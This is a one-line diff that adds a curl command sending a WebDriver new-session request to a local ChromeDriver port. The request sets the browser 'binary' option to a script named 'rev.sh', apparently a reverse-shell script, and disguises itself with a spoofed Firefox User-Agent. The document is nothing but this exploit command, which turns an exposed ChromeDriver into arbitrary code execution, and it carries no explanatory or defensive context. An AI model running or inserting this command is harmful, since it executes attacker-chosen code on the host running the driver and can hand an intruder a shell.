@@ -1,0 +1,1 @@
+curl -v -X POST 'http://127.0.0.1:9515/session' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' --data-raw '{"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary":"/home/dev/rev.sh"}}}}'
